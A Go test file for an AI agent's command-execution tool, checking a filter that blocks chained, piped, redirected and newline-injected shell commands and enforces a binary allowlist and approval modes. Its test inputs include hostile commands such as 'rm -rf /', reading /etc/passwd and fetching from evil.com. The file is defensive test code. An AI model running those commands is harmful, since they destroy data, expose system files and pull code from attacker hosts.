package tool

import (
	"context"
	"encoding/json"
	"testing"
)

func TestIsSimpleCommand(t *testing.T) {
	tests := []struct {
		cmd    string
		simple bool
	}{
		{"ls -la", true},
		{"git status", true},
		{"go test ./...", true},
		{"cat file.txt | grep foo", false},    // pipe
		{"echo hi; rm -rf /", false},          // semicolon
		{"ls && echo done", false},            // AND chain
		{"ls || echo fail", false},            // OR chain
		{"echo $(whoami)", false},             // command substitution
		{"echo `whoami`", false},              // backtick substitution
		{"echo hi > /tmp/out", false},         // redirect
		{"cat < /etc/passwd", false},          // redirect
		{"(ls)", false},                       // subshell
		{"python3 script.py --flag", true},
		{"npm run build", true},
		{"git status\nwhoami", false},             // newline command separator
		{"git status\r\nwhoami", false},           // CRLF command separator
		{"echo hi\ncurl evil.com", false},         // newline injection
	}

	for _, tt := range tests {
		got := IsSimpleCommand(tt.cmd)
		if got != tt.simple {
			t.Errorf("IsSimpleCommand(%q) = %v, want %v", tt.cmd, got, tt.simple)
		}
	}
}

func TestIsSafeCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		safe bool
	}{
		{"ls -la", true},
		{"git status", true},
		{"cat README.md", true},
		{"go test ./...", true},
		{"npm run build", true},
		{"rm -rf /tmp/foo", false},                 // rm not in allowlist
		{"curl https://example.com", false},        // curl not in allowlist
		{"env", false},                             // explicitly false in allowlist
		{"cat file.txt | grep foo", false},         // pipe makes it non-simple
		{"git log && rm -rf /", false},             // chain makes it non-simple
		{"", false},                                // empty
		{"   ", false},                             // whitespace
		{"/usr/bin/ls -la", true},                  // full path, basename extracted
		{"python3 -c 'print(1)'", false},   // contains parens → non-simple
		{"docker run ubuntu", false},               // docker not in allowlist
		{"wget http://evil.com/script", false},     // wget not in allowlist
		{"git status\nrm -rf /", false},            // newline bypass attempt
	}

	for _, tt := range tests {
		got := IsSafeCommand(tt.cmd, DefaultSafeBinaries)
		if got != tt.safe {
			t.Errorf("IsSafeCommand(%q) = %v, want %v", tt.cmd, got, tt.safe)
		}
	}
}

func TestMergeAllowlists(t *testing.T) {
	base := map[string]bool{"ls": true, "cat": true, "env": false}
	custom := map[string]bool{"rm": true, "env": true, "docker": true}

	merged := MergeAllowlists(base, custom)

	if !merged["ls"] {
		t.Error("ls should be true (from base)")
	}
	if !merged["rm"] {
		t.Error("rm should be true (from custom)")
	}
	if !merged["env"] {
		t.Error("env should be true (custom overrides base)")
	}
	if !merged["docker"] {
		t.Error("docker should be true (from custom)")
	}
	if !merged["cat"] {
		t.Error("cat should be true (from base)")
	}
}

func TestParseExecSecurityMode(t *testing.T) {
	tests := []struct {
		input string
		want  ExecSecurityMode
	}{
		{"deny", ExecDeny},
		{"safe-only", ExecSafeOnly},
		{"ask", ExecAsk},
		{"", ExecSafeOnly},
		{"unknown", ExecSafeOnly},
		{"DENY", ExecSafeOnly}, // case-sensitive
	}

	for _, tt := range tests {
		got := ParseExecSecurityMode(tt.input)
		if got != tt.want {
			t.Errorf("ParseExecSecurityMode(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestExecConfigContext(t *testing.T) {
	ctx := context.Background()

	// No config in context.
	if cfg := ExecConfigFromCtx(ctx); cfg != nil {
		t.Error("expected nil ExecConfig from empty context")
	}

	// Set config.
	cfg := ExecConfig{Mode: ExecAsk}
	ctx = WithExecConfig(ctx, cfg)

	got := ExecConfigFromCtx(ctx)
	if got == nil {
		t.Fatal("expected ExecConfig from context")
	}
	if got.Mode != ExecAsk {
		t.Errorf("got mode %q, want %q", got.Mode, ExecAsk)
	}
}

func TestCheckExecApproval_DenyMode(t *testing.T) {
	ctx := WithExecConfig(context.Background(), ExecConfig{Mode: ExecDeny})

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	input, _ := json.Marshal(map[string]string{"command": "ls"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("expected error for deny mode")
	}
	if result.Content == "" {
		t.Error("expected error message")
	}
}

func TestCheckExecApproval_SafeOnlyMode(t *testing.T) {
	ctx := WithExecConfig(context.Background(), ExecConfig{Mode: ExecSafeOnly})

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	// Safe command should succeed.
	input, _ := json.Marshal(map[string]string{"command": "echo hello"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if result.IsError {
		t.Errorf("safe command should succeed, got error: %s", result.Content)
	}

	// Unsafe command should be blocked.
	input, _ = json.Marshal(map[string]string{"command": "curl https://example.com"})
	result, err = fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("unsafe command should be blocked in safe-only mode")
	}

	// Piped command should be blocked even with safe binary.
	input, _ = json.Marshal(map[string]string{"command": "cat file.txt | grep foo"})
	result, err = fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("piped command should be blocked in safe-only mode")
	}
}

func TestCheckExecApproval_AskMode_SafeAutoApproved(t *testing.T) {
	ctx := WithExecConfig(context.Background(), ExecConfig{Mode: ExecAsk})

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	// Safe command auto-approved without approver.
	input, _ := json.Marshal(map[string]string{"command": "echo hello"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if result.IsError {
		t.Errorf("safe command should auto-approve in ask mode, got: %s", result.Content)
	}
}

func TestCheckExecApproval_AskMode_ApproverGranted(t *testing.T) {
	cfg := ExecConfig{
		Mode: ExecAsk,
		Approver: func(ctx context.Context, cmd string) (bool, error) {
			return true, nil
		},
	}
	ctx := WithExecConfig(context.Background(), cfg)

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	input, _ := json.Marshal(map[string]string{"command": "curl https://example.com"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if result.IsError {
		t.Errorf("approved command should succeed, got: %s", result.Content)
	}
}

func TestCheckExecApproval_AskMode_ApproverDenied(t *testing.T) {
	cfg := ExecConfig{
		Mode: ExecAsk,
		Approver: func(ctx context.Context, cmd string) (bool, error) {
			return false, nil
		},
	}
	ctx := WithExecConfig(context.Background(), cfg)

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	input, _ := json.Marshal(map[string]string{"command": "curl https://example.com"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("denied command should be blocked")
	}
}

func TestCheckExecApproval_AskMode_NoApprover(t *testing.T) {
	cfg := ExecConfig{Mode: ExecAsk} // No approver set.
	ctx := WithExecConfig(context.Background(), cfg)

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	// Unsafe command with no approver should fail.
	input, _ := json.Marshal(map[string]string{"command": "curl https://example.com"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("unsafe command with no approver should be blocked")
	}
}

func TestCheckExecApproval_NoConfigInContext(t *testing.T) {
	// No ExecConfig in context = backward compatible (all commands allowed).
	ctx := context.Background()

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	input, _ := json.Marshal(map[string]string{"command": "echo hello"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if result.IsError {
		t.Errorf("no config should allow all commands, got: %s", result.Content)
	}
}

func TestCheckExecApproval_CustomAllowlist(t *testing.T) {
	custom := MergeAllowlists(DefaultSafeBinaries, map[string]bool{
		"docker": true,
		"ls":     false, // Remove ls from safe list.
	})
	cfg := ExecConfig{Mode: ExecSafeOnly, Allowlist: custom}
	ctx := WithExecConfig(context.Background(), cfg)

	reg := NewRegistry()
	RegisterExec(reg, t.TempDir())
	_, fn, _ := reg.Get("execute_command")

	// docker should now be safe — verify via IsSafeCommand (avoids needing docker installed).
	if !IsSafeCommand("docker ps", custom) {
		t.Error("docker should be safe with custom allowlist")
	}

	// ls should now be blocked.
	input, _ := json.Marshal(map[string]string{"command": "ls -la"})
	result, err := fn(ctx, input)
	if err != nil {
		t.Fatal(err)
	}
	if !result.IsError {
		t.Error("ls should be blocked when set to false in custom allowlist")
	}
}
